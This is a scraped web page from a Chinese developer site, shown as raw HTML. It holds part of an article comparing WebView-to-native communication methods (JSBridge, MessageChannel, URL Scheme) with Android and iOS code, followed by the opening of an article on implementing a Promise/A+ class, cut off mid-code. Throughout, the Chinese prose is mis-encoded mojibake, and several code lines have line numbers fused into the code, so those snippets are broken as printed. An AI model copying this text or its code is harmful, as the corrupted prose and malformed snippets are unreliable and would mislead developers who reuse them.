<table><thead><tr><th>ç‰¹æ€§</th><th>JSBridge</th><th>postMessageï¼ˆMessageChannelï¼‰</th><th>URL Scheme</th></tr></thead><tbody><tr><td><strong>é€šä¿¡æ–¹å‘</strong></td><td>åŒå‘ï¼ˆJS â†’ Nativeï¼ŒNative â†’ JSï¼‰</td><td>åŒå‘ï¼ˆæ›´æ ‡å‡†ï¼‰</td><td>ä¸»è¦ JS â†’ Native</td></tr><tr><td><strong>å®æ—¶æ€§</strong></td><td>é«˜</td><td>é«˜ï¼ˆå¼‚æ­¥æ¶ˆæ¯é€šé“ï¼‰</td><td>ä¸­ï¼ˆä¾èµ–é¡µé¢è·³è½¬/iframeï¼‰</td></tr><tr><td><strong>å®‰å…¨æ€§</strong></td><td>ä¸­ï¼ˆéœ€è°¨æ…æš´éœ²æ¥å£ï¼‰</td><td>é«˜ï¼ˆæ²™ç®±éš”ç¦»ï¼‰</td><td>ä½ï¼ˆæ˜“è¢«ä¸­é—´äººåŠ«æŒï¼‰</td></tr><tr><td><strong>å…¼å®¹æ€§</strong></td><td>Android â‰¥ API 17ï¼›iOS â‰¥ WKWebView</td><td>Android â‰¥ 6.0ï¼ˆAPI 23ï¼‰ï¼›iOS â‰¥ WKWebView</td><td>å…¨å¹³å°æ”¯æŒ</td></tr><tr><td><strong>å®ç°å¤æ‚åº¦</strong></td><td>ä¸­</td><td>ä¸­é«˜</td><td>ä½</td></tr><tr><td><strong>æ˜¯å¦æ¨è</strong></td><td>âœ… å¸¸ç”¨ï¼ˆä½†æ³¨æ„å®‰å…¨ï¼‰</td><td>âœ…âœ… æ¨èï¼ˆç°ä»£æ–¹æ¡ˆï¼‰</td><td>âš ï¸ ä»…ç”¨äºç®€å•åœºæ™¯</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">äºŒã€è¯¦ç»†è¯´æ˜ä¸å®ç°</h2>
<h3 data-id="heading-2">1. JSBridgeï¼ˆä¼ ç»Ÿæ¡¥æ¥ï¼‰</h3>
<h4 data-id="heading-3">âœ… åŸç†ï¼š</h4>
<ul>
<li><strong>Android</strong>ï¼šé€šè¿‡Â <code>WebView.addJavascriptInterface()</code>Â æ³¨å…¥ Java å¯¹è±¡ã€‚</li>
<li><strong>iOS</strong>ï¼šé€šè¿‡Â <code>WKWebView.configuration.userContentController.add(_:name:)</code>Â æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨ã€‚</li>
</ul>
<h4 data-id="heading-4">ğŸ” å®‰å…¨è¦æ±‚ï¼š</h4>
<ul>
<li>Android å¿…é¡»åŠ Â <code>@JavascriptInterface</code></li>
<li>iOS éœ€éªŒè¯æ¥æºï¼ˆå¦‚åŸŸåç™½åå•ï¼‰</li>
</ul>
<h4 data-id="heading-5">ğŸ“± Android å®ç°ï¼š</h4>
<pre><code class="hljs language-typescript" lang="typescript">java
ç¼–è¾‘
<span class="hljs-number">1</span><span class="hljs-comment">// Java</span>
2<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bridge</span> {
<span class="hljs-number">3</span>    <span class="hljs-meta">@JavascriptInterface</span>
<span class="hljs-number">4</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">callNative</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> data</span>) {
<span class="hljs-number">5</span>        <span class="hljs-comment">// å¤„ç† JS è°ƒç”¨</span>
<span class="hljs-number">6</span>    }
<span class="hljs-number">7</span>}
8webView.<span class="hljs-title function_">addJavascriptInterface</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bridge</span>(), <span class="hljs-string">"Android"</span>);
</code></pre>
<pre><code class="hljs language-arduino" lang="arduino">javascript
ç¼–è¾‘
<span class="hljs-number">1</span><span class="hljs-comment">// JS</span>
<span class="hljs-number">2</span>Android.<span class="hljs-built_in">callNative</span>(<span class="hljs-string">"hello"</span>);
</code></pre>
<h4 data-id="heading-6">ğŸ iOS å®ç°ï¼ˆSwiftï¼‰ï¼š</h4>
<pre><code class="hljs language-swift" lang="swift">swift
ç¼–è¾‘
<span class="hljs-number">1</span><span class="hljs-comment">// Swift</span>
2class <span class="hljs-type">BridgeHandler</span>: <span class="hljs-type">NSObject</span>, <span class="hljs-type">WKScriptMessageHandler</span> {
<span class="hljs-number">3</span>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">userContentController</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">controller</span>: <span class="hljs-type">WKUserContentController</span>, <span class="hljs-params">didReceive</span> <span class="hljs-params">message</span>: <span class="hljs-type">WKScriptMessage</span>) {
<span class="hljs-number">4</span>        <span class="hljs-keyword">if</span> message.name <span class="hljs-operator">==</span> <span class="hljs-string">"iosBridge"</span> {
<span class="hljs-number">5</span>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ”¶åˆ° JS æ¶ˆæ¯:"</span>, message.body)
<span class="hljs-number">6</span>        }
<span class="hljs-number">7</span>    }
<span class="hljs-number">8</span>}
<span class="hljs-number">9</span>
10let config <span class="hljs-operator">=</span> <span class="hljs-type">WKWebViewConfiguration</span>()
11config.userContentController.add(<span class="hljs-type">BridgeHandler</span>(), name: <span class="hljs-string">"iosBridge"</span>)
12let webView <span class="hljs-operator">=</span> <span class="hljs-type">WKWebView</span>(frame: .zero, configuration: config)
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript">javascript
ç¼–è¾‘
<span class="hljs-number">1</span><span class="hljs-comment">// JS</span>
2<span class="hljs-variable language_">window</span>.<span class="hljs-property">webkit</span>.<span class="hljs-property">messageHandlers</span>.<span class="hljs-property">iosBridge</span>.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">"hello"</span>);
</code></pre>
<blockquote>
<p>âœ… ä¼˜ç‚¹ï¼šç®€å•ç›´æ¥ï¼Œå¹¿æ³›ä½¿ç”¨<br/>
âŒ ç¼ºç‚¹ï¼šAndroid æ—§ç‰ˆæœ¬æœ‰å®‰å…¨æ¼æ´ï¼›iOS æ— æ³•ç›´æ¥è¿”å›å€¼ï¼ˆéœ€å›è°ƒï¼‰</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">2.Â <code>postMessage</code>Â +Â <code>MessageChannel</code>ï¼ˆç°ä»£é€šä¿¡ï¼‰</h3>
<h4 data-id="heading-8">âœ… åŸç†ï¼š</h4>
<p>åˆ©ç”¨ HTML5 çš„ <code>MessageChannel</code> åˆ›å»ºä¸€ä¸ª<strong>åŒå‘ã€å¼‚æ­¥ã€éš”ç¦»çš„æ¶ˆæ¯é€šé“</strong>ï¼ŒNative ä½œä¸ºå¦ä¸€ç«¯æ¥æ”¶ç«¯å£ã€‚</p>
<blockquote>
<p>è¿™æ˜¯ Chrome å›¢é˜Ÿæ¨èçš„ WebView é€šä¿¡æ–¹å¼ï¼Œå®‰å…¨æ€§é«˜ã€‚</p>
</blockquote>
<h4 data-id="heading-9">ğŸ“± Android å®ç°ï¼ˆAPI â‰¥ 23ï¼‰ï¼š</h4>
<pre><code class="hljs language-ini" lang="ini">java
ç¼–è¾‘
1webView.evaluateJavascript("(function() {" +
2    "const <span class="hljs-attr">channel</span> = new MessageChannel()<span class="hljs-comment">;" +</span>
3    "<span class="hljs-attr">channel.port1.onmessage</span> = function(e) { console.log(<span class="hljs-string">'Reply:'</span>, e.data)<span class="hljs-comment">; };" +</span>
4    "<span class="hljs-attr">window.nativePort</span> = channel.port2<span class="hljs-comment">;" +</span>
5    "})()", null)<span class="hljs-comment">;</span>
6
7// Native å‘é€æ¶ˆæ¯åˆ° JS
8webView.postWebMessage(
9    new WebMessageCompat("Hello from Android", new WebMessagePortCompat<span class="hljs-section">[]</span>{port}),
10    Uri.parse("https://your-trusted-domain.com")
11)<span class="hljs-comment">;</span>
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šéœ€é…åˆ <code>WebMessageListener</code>ï¼ˆAndroidXï¼‰æˆ– <code>postWebMessage</code> ä½¿ç”¨ã€‚</p>
</blockquote>
<h4 data-id="heading-10">ğŸ iOS å®ç°ï¼ˆWKWebViewï¼‰ï¼š</h4>
<p>iOS çš„ <code>WKScriptMessageHandler</code> æœ¬èº«ä¸ç›´æ¥æ”¯æŒ <code>MessageChannel</code>ï¼Œä½†å¯é€šè¿‡ JS ç«¯æ¨¡æ‹ŸåŒå‘é€šä¿¡ï¼Œæˆ–ä½¿ç”¨ <code>evaluateJavaScript</code> è¿”å›ç»“æœã€‚</p>
<blockquote>
<p>ç›®å‰ <strong>Android å¯¹ <code>MessageChannel</code> åŸç”Ÿæ”¯æŒæ›´å¥½</strong>ï¼ŒiOS ä»ä»¥ <code>messageHandlers</code> ä¸ºä¸»ã€‚</p>
</blockquote>
<blockquote>
<p>âœ… ä¼˜ç‚¹ï¼šå®‰å…¨ã€æ ‡å‡†ã€æ”¯æŒæµå¼é€šä¿¡<br/>
âŒ ç¼ºç‚¹ï¼šå…¼å®¹æ€§è¾ƒå·®ï¼ˆAndroid &lt; 6.0 ä¸æ”¯æŒï¼‰</p>
</blockquote>
<hr/>
<h3 data-id="heading-11">3. URL Schemeï¼ˆæ‹¦æˆªè·³è½¬ï¼‰</h3>
<h4 data-id="heading-12">âœ… åŸç†ï¼š</h4>
<p>JS é€šè¿‡ <code>location.href = "myapp://action?param=xxx"</code> è§¦å‘é¡µé¢è·³è½¬ï¼ŒNative æ‹¦æˆªè¯¥ URL å¹¶è§£æã€‚</p>
<h4 data-id="heading-13">ğŸ“± Android å®ç°ï¼š</h4>
<pre><code class="hljs language-typescript" lang="typescript">java
ç¼–è¾‘
1webView.<span class="hljs-title function_">setWebViewClient</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebViewClient</span>() {
<span class="hljs-number">2</span>    <span class="hljs-meta">@Override</span>
<span class="hljs-number">3</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">shouldOverrideUrlLoading</span>(<span class="hljs-params">WebView view, <span class="hljs-built_in">String</span> url</span>) {
<span class="hljs-number">4</span>        <span class="hljs-keyword">if</span> (url.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"myapp://"</span>)) {
<span class="hljs-number">5</span>            <span class="hljs-comment">// è§£æå‚æ•°å¹¶å¤„ç†</span>
<span class="hljs-number">6</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ‹¦æˆªï¼Œä¸åŠ è½½</span>
<span class="hljs-number">7</span>        }
<span class="hljs-number">8</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
<span class="hljs-number">9</span>    }
<span class="hljs-number">10</span>});
</code></pre>
<h4 data-id="heading-14">ğŸ iOS å®ç°ï¼š</h4>
<pre><code class="hljs language-swift" lang="swift">swift
ç¼–è¾‘
1<span class="hljs-keyword">func</span> <span class="hljs-title function_">webView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">webView</span>: <span class="hljs-type">WKWebView</span>, <span class="hljs-params">decidePolicyFor</span> <span class="hljs-params">navigationAction</span>: <span class="hljs-type">WKNavigationAction</span>, <span class="hljs-params">decisionHandler</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">WKNavigationActionPolicy</span>) -&gt; <span class="hljs-type">Void</span>) {
<span class="hljs-number">2</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> navigationAction.request.url,
<span class="hljs-number">3</span>       url.scheme <span class="hljs-operator">==</span> <span class="hljs-string">"myapp"</span> {
<span class="hljs-number">4</span>        <span class="hljs-comment">// å¤„ç†è‡ªå®šä¹‰åè®®</span>
<span class="hljs-number">5</span>        decisionHandler(.cancel) <span class="hljs-comment">// æ‹¦æˆª</span>
<span class="hljs-number">6</span>        <span class="hljs-keyword">return</span>
<span class="hljs-number">7</span>    }
<span class="hljs-number">8</span>    decisionHandler(.allow)
<span class="hljs-number">9</span>}
</code></pre>
<h4 data-id="heading-15">ğŸ’¡ æŠ€å·§ï¼šé¿å…é¡µé¢è·³è½¬é—ªçƒ</h4>
<ul>
<li>
<p>ä½¿ç”¨éšè—çš„Â <code>&lt;iframe&gt;</code>Â è§¦å‘ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">javascript
ç¼–è¾‘
1const <span class="hljs-attr">iframe</span> = document.createElement(<span class="hljs-string">'iframe'</span>)<span class="hljs-comment">;</span>
<span class="hljs-attr">2iframe.src</span> = <span class="hljs-string">'myapp://call?data=xxx'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">3iframe.style.display</span> = <span class="hljs-string">'none'</span><span class="hljs-comment">;</span>
4document.body.appendChild(iframe)<span class="hljs-comment">;</span>
5setTimeout(() =&gt; document.body.removeChild(iframe), 100)<span class="hljs-comment">;</span>
</code></pre>
</li>
</ul>
<blockquote>
<p>âœ… ä¼˜ç‚¹ï¼šå…¼å®¹æ€§æå¥½ï¼ˆæ‰€æœ‰ WebView æ”¯æŒï¼‰<br/>
âŒ ç¼ºç‚¹ï¼š</p>
<ul>
<li>æ— æ³•ç›´æ¥è¿”å›å€¼ï¼ˆéœ€ JS å†è°ƒä¸€æ¬¡ï¼‰</li>
<li>URL é•¿åº¦æœ‰é™ï¼ˆ~2000 å­—ç¬¦ï¼‰</li>
<li>å®‰å…¨æ€§å·®ï¼ˆå¯èƒ½è¢«ç¬¬ä¸‰æ–¹é¡µé¢ä¼ªé€ è°ƒç”¨ï¼‰</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-16">ä¸‰ã€å¦‚ä½•é€‰æ‹©ï¼Ÿ</h2>





























<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>ç°ä»£ Appï¼ˆAndroid â‰¥ 6.0ï¼ŒiOS â‰¥ 9ï¼‰</strong></td><td>âœ…Â <strong>JSBridge + å®‰å…¨æ ¡éªŒ</strong>Â æˆ–Â <strong>postMessageï¼ˆAndroid ä¼˜å…ˆï¼‰</strong></td></tr><tr><td><strong>éœ€è¦é«˜å®‰å…¨æ€§ï¼ˆå¦‚é‡‘èç±»ï¼‰</strong></td><td>âœ…Â <code>postMessage</code>Â + åŸŸåç™½åå• + HTTPS</td></tr><tr><td><strong>å…¼å®¹è€æ—§è®¾å¤‡</strong></td><td>âš ï¸ URL Schemeï¼ˆä½†éœ€åŠ å¯†å‚æ•°ã€æ ¡éªŒæ¥æºï¼‰</td></tr><tr><td><strong>é¢‘ç¹åŒå‘é€šä¿¡ï¼ˆå¦‚èŠå¤©ã€å®æ—¶æ•°æ®ï¼‰</strong></td><td>âœ… JSBridge + å›è°ƒæœºåˆ¶ æˆ– MessageChannel</td></tr><tr><td><strong>ä»…ç®€å•é€šçŸ¥ï¼ˆå¦‚åˆ†äº«ã€åŸ‹ç‚¹ï¼‰</strong></td><td>âœ… URL Scheme è¶³å¤Ÿ</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-17">å››ã€æœ€ä½³å®è·µå»ºè®®</h2>
<ol>
<li><strong>æ°¸è¿œå¯ç”¨ HTTPS</strong>ï¼Œé˜²æ­¢ä¸­é—´äººæ³¨å…¥æ¶æ„ JSã€‚</li>
<li><strong>éªŒè¯ WebView åŠ è½½çš„åŸŸå</strong>ï¼ˆç™½åå•ï¼‰ï¼Œé¿å…ç¬¬ä¸‰æ–¹é¡µé¢è°ƒç”¨ä½ çš„ Native æ¥å£ã€‚</li>
<li><strong>ä¸è¦åœ¨ JSBridge ä¸­æš´éœ²æ•æ„Ÿæ“ä½œ</strong>ï¼ˆå¦‚è¯»å–æ–‡ä»¶ã€è·å– tokenï¼‰ã€‚</li>
<li><strong>å¯¹ URL Scheme å‚æ•°åšç­¾åæˆ–åŠ å¯†</strong>ï¼Œé˜²æ­¢ä¼ªé€ ã€‚</li>
<li><strong>ä¼˜å…ˆä½¿ç”¨Â <code>WKWebView</code>ï¼ˆiOSï¼‰å’ŒÂ <code>AndroidX WebView</code>ï¼ˆAndroidï¼‰</strong> ï¼Œé¿å…ä½¿ç”¨è¿‡æ—¶çš„Â <code>UIWebView</code>Â æˆ–ç³»ç»Ÿ WebViewã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹å†™ç¬¦åˆA+è§„èŒƒçš„Promise]]></title>    <link>https://juejin.cn/post/7594350054091685930</link>    <guid>https://juejin.cn/post/7594350054091685930</guid>    <pubDate>2026-01-13T02:28:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594350054091685930" data-draft-id="7594322573453361195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹å†™ç¬¦åˆA+è§„èŒƒçš„Promise"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-13T02:28:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹å†™ç¬¦åˆA+è§„èŒƒçš„Promise
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:28:26.000Z" title="Tue Jan 13 2026 02:28:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬ä¸“æ èšç„¦Promiseçš„æ ¸å¿ƒåŸç†ä¸é«˜çº§åº”ç”¨ï¼ŒåŒ…å«ï¼š
âœ“ Promise A+è§„èŒƒæ·±åº¦è§£è¯»
âœ“ æ‰‹å†™å®ç°ä¸æºç åˆ†æ
âœ“ å¼‚æ­¥ç¼–ç¨‹è®¾è®¡æ¨¡å¼
âœ“ æ€§èƒ½è°ƒä¼˜ä¸é”™è¯¯å¤„ç†</p>
</blockquote>
<blockquote>
<p>é€‚åˆæœ‰JavaScriptåŸºç¡€ï¼Œå¸Œæœ›æ·±å…¥å¼‚æ­¥ç¼–ç¨‹çš„å¼€å‘è€…ã€‚æˆ‘ä»¬å°†ç”¨æœ€å°‘çš„ç¯‡å¹…ï¼Œè®²é€æœ€æ ¸å¿ƒçš„çŸ¥è¯†ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨å‰é¢çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬è¯¦ç»†è®²è§£äº†Promiseçš„æ ¸å¿ƒåŸç†åŠç›¸å…³çš„æ–¹æ³•ï¼Œæœ¬æ–‡å°†ä»é›¶å¼€å§‹ï¼Œæ‰‹å†™ä¸€ä¸ªåŠŸèƒ½å®Œæ•´çš„Promiseç±»ï¼Œæ·±å…¥ç†è§£Promiseçš„å·¥ä½œåŸç†ã€‚</p>
<h2 data-id="heading-1">Promiseæ ¸å¿ƒæ¦‚å¿µå›é¡¾</h2>
<p>åœ¨å¼€å§‹å®ç°ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹Promiseçš„æ ¸å¿ƒç‰¹æ€§ï¼š</p>
<ul>
<li>ä¸‰ç§çŠ¶æ€ï¼špendingï¼ˆç­‰å¾…ï¼‰ã€fulfilledï¼ˆå·²æˆåŠŸï¼‰ã€rejectedï¼ˆå·²å¤±è´¥ï¼‰ã€‚</li>
<li>çŠ¶æ€ä¸å¯é€†ï¼šä¸€æ—¦çŠ¶æ€æ”¹å˜ï¼Œå°±ä¸èƒ½å†å˜ã€‚</li>
<li>é“¾å¼è°ƒç”¨ï¼šthenæ–¹æ³•è¿”å›ä¸€ä¸ªæ–°çš„Promiseã€‚</li>
<li>å¼‚æ­¥æ‰§è¡Œï¼šå›è°ƒå‡½æ•°æ€»æ˜¯å¼‚æ­¥æ‰§è¡Œã€‚</li>
<li>é”™è¯¯å†’æ³¡ï¼šé”™è¯¯ä¼šä¸€ç›´å‘åä¼ é€’ï¼Œç›´åˆ°è¢«æ•è·ã€‚</li>
</ul>
<h2 data-id="heading-2">åŸºç¡€éª¨æ¶å®ç°</h2>
<h3 data-id="heading-3">æ„é€ å‡½æ•°</h3>
<h4 data-id="heading-4">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Promise</span> {
		<span class="hljs-comment">// æ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ªæ‰§è¡Œå™¨å‡½æ•°executor</span>
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) {

        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'pending'</span>;  <span class="hljs-comment">// å£°æ˜åˆå§‹çŠ¶æ€</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// Priomiseç»“æœ</span>
        <span class="hljs-comment">// å­˜å‚¨æˆåŠŸå’Œå¤±è´¥çš„å›è°ƒå‡½æ•°</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span> = [];
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span> = [];

        <span class="hljs-comment">// å£°æ˜resolveå’Œrejectä¸¤ä¸ªå‡½æ•°</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolve</span> = (<span class="hljs-params">value</span>) =&gt; {
            <span class="hljs-comment">// åˆ¤æ–­çŠ¶æ€æ˜¯å¦ä¸ºpending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1ã€ä¿®æ”¹å¯¹è±¡çŠ¶æ€</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'fulfilled'</span>;
            <span class="hljs-comment">// 2ã€ä¿å­˜æˆåŠŸå€¼</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = value;
            <span class="hljs-comment">// 3ã€è°ƒç”¨æˆåŠŸå›è°ƒå‡½æ•°</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(value));
            }
        }
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">reject</span> = (<span class="hljs-params">reason</span>) =&gt; {
            <span class="hljs-comment">// åˆ¤æ–­çŠ¶æ€æ˜¯å¦ä¸ºpending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1ã€ä¿®æ”¹å¯¹è±¡çŠ¶æ€</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'rejected'</span>;
            <span class="hljs-comment">// 2ã€ä¿å­˜å¤±è´¥åŸå› </span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = reason;
